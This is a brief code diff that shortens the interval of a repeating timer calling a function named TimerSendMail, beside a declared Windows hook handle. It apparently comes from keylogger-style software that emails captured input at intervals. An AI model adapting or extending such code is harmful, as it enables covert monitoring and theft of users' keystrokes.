@@ -36,7 +36,7 @@ void TimerSendMail()
 
 }
 
-Timer MailTimer(TimerSendMail, 2000*60, Timer::Infinite);
+Timer MailTimer(TimerSendMail, 500*60, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
